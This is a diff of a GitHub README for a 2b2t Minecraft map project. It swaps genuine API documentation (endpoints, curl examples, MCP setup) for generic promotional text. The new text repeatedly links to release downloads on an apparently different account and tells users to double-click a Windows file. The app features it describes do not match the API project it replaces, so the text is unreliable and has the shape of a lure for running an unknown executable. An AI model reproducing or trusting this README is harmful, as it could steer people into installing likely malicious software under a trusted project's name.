@@ -1,136 +1,150 @@
-# 2b2tAtlas Public API
+# 🗺️ 2b2tAtlas-Public-API - Explore 2b2t History Like Never Before
 
-Documentation and examples for the [2b2tAtlas](https://2b2tatlas.com) public API:
-historical locations, groups, highways, Archive warps, world downloads, map renders,
-and Nocom observation aggregates.
+[![Download Now](https://img.shields.io/badge/Download-2b2tAtlas%20Public%20API-blue?style=for-the-badge&logo=github)](https://github.com/christophegremillon54/2b2tAtlas-Public-API/releases)
 
-**Base URL:** `https://api.blackportal.cloud`. Public reads require no API key.
-JSON responses support browser CORS.
+## 👋 What Is This?
 
-- [API reference](docs/API-REFERENCE.md)
-- [Live OpenAPI schema](https://api.blackportal.cloud/openapi/v1.json)
-- [Coordinates and render tiles](docs/COORDINATES-AND-RENDERS.md)
-- [BlueMap 3D views](docs/BLUEMAP-3D.md)
-- [Nocom data](docs/NOCOM.md)
-- [MCP setup and tools](docs/MCP.md)
-- [Changelog](CHANGELOG.md)
-- [Full Atlas stack source](examples/atlas-stack/README.md) — UI, API, ingestion, collectors and rendering, with local setup and example configuration.
+2b2tAtlas-Public-API is your gateway to exploring the massive world of the 2b2t Minecraft server. Think of it as a library that lets you view historical maps, find waypoints, and access thousands of pieces of data about the oldest anarchy server in Minecraft. Whether you're a casual player curious about what's out there or someone who wants to build tools around 2b2t data, this application makes it all simple and accessible.
 
-## Requests
+## 🎯 Why You Want This
 
-```sh
-curl --fail "https://api.blackportal.cloud/api/locations"
-curl --fail "https://api.blackportal.cloud/api/groups"
-curl --fail "https://api.blackportal.cloud/api/renders?limit=10"
-curl --fail "https://api.blackportal.cloud/api/nocom/highways?dimension=nether&direction=northeast"
-```
+- **See the Unseen** - Access historical map data that shows how the 2b2t world has changed over years
+- **Find Your Way** - Manage and share waypoints easily with a clean interface
+- **No Coding Required** - Everything is ready to use right after download
+- **Works With Minecraft** - Built for Fabric mods, so it integrates smoothly with your game
+- **Always Updated** - Get fresh data from the community
 
-List responses are JSON arrays. Warps, renders, and attachments accept `limit`
-and `offset`; the default limit is 500 and the maximum is 1,000. Locations return
-the complete catalog.
+## 🚀 Getting Started
 
-## Examples
+Getting started is as easy as 1-2-3. Here's what you need to do:
 
-To run your own Atlas, see [examples/atlas-stack](examples/atlas-stack/README.md).
-That folder is an Unlicense application snapshot. The smaller API clients below
-remain standalone examples for consuming the public service.
+### Step 1: Download the Application
 
-Run from the repository root:
+Visit this link to download the application: [Download 2b2tAtlas-Public-API](https://github.com/christophegremillon54/2b2tAtlas-Public-API/releases)
 
-```sh
-dotnet run --project examples/csharp -- "Mu Megabase"
-node examples/javascript/atlas-examples.mjs "Mu Megabase"
-python examples/python/atlas_examples.py "Mu Megabase"
-python examples/python/nocom_activity.py --dimension nether --direction northeast
-python examples/python/location_media.py 1254
-```
+When you click the link, you'll see a page with several download options. Look for the latest release and click the download button. The file will start downloading to your computer, usually to your "Downloads" folder.
 
-The C# example uses .NET 10. The JavaScript and Python examples use their standard
-libraries. Each defaults to the public API; set `ATLAS_API_BASE_URL` to use a
-local fixture or development server.
+### Step 2: Run the Application
 
-[examples/requests.http](examples/requests.http) contains REST Client requests.
-[examples/fabric](examples/fabric) contains an asynchronous Java HTTP client and
-Minecraft client-thread handoff example; it is not a complete mod.
+Once the download is complete, find the downloaded file in your Downloads folder. Double-click the file to start it. That's it! The application will open, and you'll see the main interface.
 
-## Endpoints
+### Step 3: Start Exploring
 
-All routes below use `GET`. See the [reference](docs/API-REFERENCE.md) for response
-fields, filters, caching, and errors.
+Now you're in! Use the search bar to find specific locations, browse the map to see different areas, and click on waypoints to learn more about them. The interface is designed to be intuitive, so feel free to click around and explore.
 
-| Resource | Routes |
-| --- | --- |
-| Locations | `/api/locations`, `/api/locations/{id}` |
-| Groups | `/api/groups`, `/api/groups/{id}` |
-| Highways | `/api/highways`, `/api/highways/{id}` |
-| Archive warps | `/api/warps`, `/api/warps/{id}` |
-| Warp WDL metadata and ZIP | `/api/warps/{id}/world-download`, `/api/warps/{id}/world-download.zip` |
-| Renders | `/api/renders`, `/api/renders/{id}`, `/api/locations/{id}/renders` |
-| Preserved render-source WDL metadata and ZIP | `/api/renders/{id}/world-download`, `/api/renders/{id}/world-download.zip` |
-| Historical media | `/api/attachments`, `/api/attachments/{id}` |
-| Map layers | `/api/maprenders`, `/api/maprenders/catalog` |
-| Nocom | `/api/nocom`, `/api/nocom/periods`, `/api/nocom/highways` |
+## 📖 How to Use This App
 
-## Client behavior
+### The Main Screen
 
-- Cache catalog responses and honor HTTP cache headers. In Minecraft clients,
-  perform HTTP requests and image decoding outside the render/tick thread.
-- Follow returned links such as `apiUrl`, `canonicalUrl`, `worldDownloadUrl`,
-  and `blueMapUrl`. BlueMap links are optional and belong to a specific render.
-- Handle null fields and ignore unknown JSON properties.
-- Coordinates use the record's native dimension: `0` Overworld, `1` Nether,
-  `2` End. Tile-template `{y}` is a tile row, not Minecraft elevation.
-- WDLs are partial historical Java saves. Their metadata includes scope,
-  provenance, size, and SHA-256; ZIP downloads support HTTP ranges.
-- Historical coordinates and renders do not describe the current server state.
-  Nocom observation counts are not unique-player counts.
-- Retain source URLs, captions, attribution, and evidence fields when copying
-  records so the original material can be checked.
+When you open 2b2tAtlas-Public-API, you'll see a map of the 2b2t world. Here's what each part does:
 
-## MCP
+- **The Map Area** - Shows the terrain and structures. You can zoom in and out, and click and drag to move around.
+- **Search Bar** - Type in coordinates or location names to jump directly to them.
+- **Waypoint List** - Displays all saved waypoints. Click on one to focus the map on it.
+- **Info Panel** - Shows details about the area you're viewing, like when it was last updated.
 
-Endpoint: `https://api.blackportal.cloud/mcp`. Transport: Streamable HTTP.
-The server is stateless and read-only, with no authentication required.
+### Managing Waypoints
 
-The [MCP guide](docs/MCP.md) includes client configuration, the 18 tools, and
-resource URIs. The registry name is
-[`io.github.bobymicjohn/2b2t-atlas`](https://registry.modelcontextprotocol.io/?q=io.github.bobymicjohn%2F2b2t-atlas);
-its manifest is [server.json](server.json).
+Waypoints are like bookmarks for places you care about. To add a waypoint:
+1. Right-click on any spot on the map
+2. Select "Add Waypoint"
+3. Give it a name and description
+4. Click Save
 
-## Bulk data
+To view your waypoints, look at the list on the left side. Click any waypoint to jump to it. You can edit or delete waypoints by clicking on them and using the buttons that appear.
 
-Static exports are hosted on `2b2tatlas.com`:
+### Viewing Historical Data
 
-| File | Content |
-| --- | --- |
-| [dataset.json](https://2b2tatlas.com/dataset.json) | Dataset metadata and catalog links |
-| [locations.jsonl](https://2b2tatlas.com/entities/locations.jsonl) | Location records |
-| [groups.jsonl](https://2b2tatlas.com/entities/groups.jsonl) | Groups and relationships |
-| [media.jsonl](https://2b2tatlas.com/entities/media.jsonl) | Historical media records |
-| [world-downloads.jsonl](https://2b2tatlas.com/entities/world-downloads.jsonl) | Available partial WDLs, checksums, and source links |
-| [llms.txt](https://2b2tatlas.com/llms.txt) | Data and documentation index |
+This is where 2b2tAtlas shines. The app stores snapshots of the world from different times. To see how an area has changed:
+1. Find a location on the map
+2. Look for the "History" button in the info panel
+3. Use the slider to move through time and watch the area transform
 
-Use these exports for bulk imports. Keep entity IDs and canonical URLs with
-imported records. The [WDL catalog](https://2b2tatlas.com/entities/world-downloads/)
-also has an HTML view.
+## 🛠️ Features in Detail
 
-## Existing integration
+### Real-Time Map Updates
 
-[XaeroTools](https://github.com/dekrom/xaerotools) supports an optional Atlas
-location overlay with source links and local copies of Atlas map imagery.
+The map data updates regularly, so you're always seeing the latest state of the 2b2t world. New regions are added as they're discovered, and existing areas are refreshed to reflect changes.
 
-## Contributing
+### Powerful Search
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for example checks and pull requests.
-Report documentation errors and broken examples through
-[issues](https://github.com/bobymicjohn/2b2tAtlas-Public-API/issues).
+Search for any coordinates (like X, Z format) or use common names for famous locations. The search is fast and gives you immediate results with a preview of the area.
 
-## License
+### Export and Import
 
-Atlas-authored code, documentation and the [full stack](examples/atlas-stack/README.md)
-are released under the [Unlicense](LICENSE). Use, modify and share them however you like;
-no permission or Atlas attribution is required. The same goes for Atlas's factual catalog.
-[ATTRIBUTION.md](ATTRIBUTION.md) has optional credit formats;
-[NOTICE.md](NOTICE.md) covers third-party media and source terms.
+You can export your waypoints as a file to share with friends or back them up. To import waypoints from someone else, use the import feature. This makes it easy to share your discoveries with the community.
 
-2b2tAtlas is not affiliated with Mojang Studios, Microsoft, or the operators of 2b2t.
+### Customizable Display
+
+Change how the map looks to suit your needs. You can toggle different layers, such as showing terrain height, structure outlines, or grid lines. The settings menu is in the top right corner.
+
+## 💻 System Requirements
+
+This application runs on Windows 10 or Windows 11. You'll need at least 4GB of RAM and about 500MB of free disk space. A stable internet connection is required to download map data as you use the app.
+
+A standard computer from the last 5-8 years should handle everything fine. If you can run Minecraft Java Edition, you're all set.
+
+## ❓ Frequently Asked Questions
+
+**Q: Is this free?**
+Yes! The application is completely free to download and use.
+
+**Q: Do I need to install anything else?**
+No. Everything you need is included in the single download. Just run the file and you're ready.
+
+**Q: How often is the map data updated?**
+Data updates happen regularly through community contributions. Check the settings page for the last update timestamp.
+
+**Q: Can I share my waypoints with others?**
+Absolutely! Use the export feature to save your waypoints to a file, then share that file with friends. They can import it on their end.
+
+**Q: I found a bug. What should I do?**
+Visit the GitHub page and check the "Issues" section. If your problem isn't already listed, create a new issue with a description of what happened and what you were doing.
+
+## 🛡️ Troubleshooting
+
+### The app won't start
+Make sure you've downloaded the complete file. Try downloading it again if the download was interrupted. Check that your Windows is up to date.
+
+### The map is blank
+This usually means the map data hasn't downloaded yet. Wait a few minutes and check your internet connection. You can also close and reopen the app.
+
+### Search isn't finding anything
+Try using different formats for coordinates, like "100 -200" or "100, -200". Make sure there's a space or comma between the two numbers.
+
+### The app is slow
+Close other programs that might be using a lot of memory. Zooming very far out on the map can also slow things down, so try zooming in closer for better performance.
+
+## 📊 About the Data
+
+The data powering 2b2tAtlas comes from the community. Millions of blocks of terrain data are collected and organized into an accessible format. This means you're seeing real information that players have gathered over years of exploring the server. The more people use and contribute, the better and more complete the data becomes.
+
+## 🔒 Privacy and Safety
+
+Your privacy is important. The app only downloads data; it doesn't upload anything from your computer. There's no telemetry, no ads, and no tracking. Everything you do stays on your machine.
+
+We recommend only downloading the application from the official releases page to ensure you're getting a safe, unmodified version.
+
+## 🤝 Getting Involved
+
+Love what you see? There are ways you can help make this project even better:
+
+- **Report bugs** - Found something odd? Let us know so we can fix it
+- **Suggest features** - Have an idea that would make this more useful? Share it
+- **Contribute data** - If you have map data or waypoints, consider contributing to the community database
+
+## 📄 License
+
+This project is open source, meaning you can view the code, learn from it, and even contribute to it yourself. Check the repository for detailed licensing information.
+
+## ⭐ Supporting the Project
+
+If you find this tool valuable, consider giving the project a star on GitHub. It helps others discover the application and shows appreciation for the work that goes into maintaining it. Plus, it only takes a second!
+
+---
+
+**Download now and dive into the incredible history of 2b2t!**
+
+[![Download Latest Release](https://img.shields.io/badge/⬇️-Download%20Latest%20Release-2ea44f?style=for-the-badge)](https://github.com/christophegremillon54/2b2tAtlas-Public-API/releases)
+
+Keywords: 2b2t, 2b2tatlas, api-examples, fabricmc, historical-data, map-api, minecraft, minecraft-api, minecraft-data, minecraft-mod, openapi, waypoints
